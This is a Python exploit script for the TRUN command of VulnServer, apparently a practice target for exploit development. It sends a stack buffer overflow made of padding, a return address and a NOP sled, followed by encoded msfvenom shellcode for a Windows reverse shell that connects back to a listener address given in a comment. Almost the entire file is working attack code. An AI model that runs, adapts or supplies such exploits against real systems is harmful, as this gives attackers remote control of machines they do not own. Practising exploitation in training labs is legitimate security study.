#!/usr/bin/python3

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.218 LPORT=1010 -b "\x00" -a x86 --platform windows EXITFUNC=thread -f py -e x86/shikata_ga_nai

import sys,socket
from time import sleep

print("************VulnServer TRUN**********")

ip_address=input("Enter the IP address\n")
port_number=input("Enter the port number\n")

if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("*" * 30)
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("*" * 30)
        print("IP Address field is empty")
    elif (len(ip_address)<=0) and (len(port_number)<=0):
        print("*" * 30)
        print("IP Address field is empty")
        print("Port number field is empty")
    else:
        print("*" * 30)
        print("Issues with the user input")
else:
    buf =  b""
    buf += b"\xbd\x0b\x87\x7b\x1c\xd9\xcd\xd9\x74\x24\xf4\x5a"
    buf += b"\x2b\xc9\xb1\x52\x83\xea\xfc\x31\x6a\x0e\x03\x61"
    buf += b"\x89\x99\xe9\x89\x7d\xdf\x12\x71\x7e\x80\x9b\x94"
    buf += b"\x4f\x80\xf8\xdd\xe0\x30\x8a\xb3\x0c\xba\xde\x27"
    buf += b"\x86\xce\xf6\x48\x2f\x64\x21\x67\xb0\xd5\x11\xe6"
    buf += b"\x32\x24\x46\xc8\x0b\xe7\x9b\x09\x4b\x1a\x51\x5b"
    buf += b"\x04\x50\xc4\x4b\x21\x2c\xd5\xe0\x79\xa0\x5d\x15"
    buf += b"\xc9\xc3\x4c\x88\x41\x9a\x4e\x2b\x85\x96\xc6\x33"
    buf += b"\xca\x93\x91\xc8\x38\x6f\x20\x18\x71\x90\x8f\x65"
    buf += b"\xbd\x63\xd1\xa2\x7a\x9c\xa4\xda\x78\x21\xbf\x19"
    buf += b"\x02\xfd\x4a\xb9\xa4\x76\xec\x65\x54\x5a\x6b\xee"
    buf += b"\x5a\x17\xff\xa8\x7e\xa6\x2c\xc3\x7b\x23\xd3\x03"
    buf += b"\x0a\x77\xf0\x87\x56\x23\x99\x9e\x32\x82\xa6\xc0"
    buf += b"\x9c\x7b\x03\x8b\x31\x6f\x3e\xd6\x5d\x5c\x73\xe8"
    buf += b"\x9d\xca\x04\x9b\xaf\x55\xbf\x33\x9c\x1e\x19\xc4"
    buf += b"\xe3\x34\xdd\x5a\x1a\xb7\x1e\x73\xd9\xe3\x4e\xeb"
    buf += b"\xc8\x8b\x04\xeb\xf5\x59\x8a\xbb\x59\x32\x6b\x6b"
    buf += b"\x1a\xe2\x03\x61\x95\xdd\x34\x8a\x7f\x76\xde\x71"
    buf += b"\xe8\xb9\xb7\x1d\x32\x51\xca\xdd\xc1\x50\x43\x3b"
    buf += b"\xaf\x84\x02\x94\x58\x3c\x0f\x6e\xf8\xc1\x85\x0b"
    buf += b"\x3a\x49\x2a\xec\xf5\xba\x47\xfe\x62\x4b\x12\x5c"
    buf += b"\x24\x54\x88\xc8\xaa\xc7\x57\x08\xa4\xfb\xcf\x5f"
    buf += b"\xe1\xca\x19\x35\x1f\x74\xb0\x2b\xe2\xe0\xfb\xef"
    buf += b"\x39\xd1\x02\xee\xcc\x6d\x21\xe0\x08\x6d\x6d\x54"
    buf += b"\xc5\x38\x3b\x02\xa3\x92\x8d\xfc\x7d\x48\x44\x68"
    buf += b"\xfb\xa2\x57\xee\x04\xef\x21\x0e\xb4\x46\x74\x31"
    buf += b"\x79\x0f\x70\x4a\x67\xaf\x7f\x81\x23\xcf\x9d\x03"
    buf += b"\x5e\x78\x38\xc6\xe3\xe5\xbb\x3d\x27\x10\x38\xb7"
    buf += b"\xd8\xe7\x20\xb2\xdd\xac\xe6\x2f\xac\xbd\x82\x4f"
    buf += b"\x03\xbd\x86"


    size=b"A" * 2003 + b"\xAF\x11\x50\x62" + b"\x90"* 8 + buf 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    s.send(b"TRUN /.:/" +size)
    s.close()
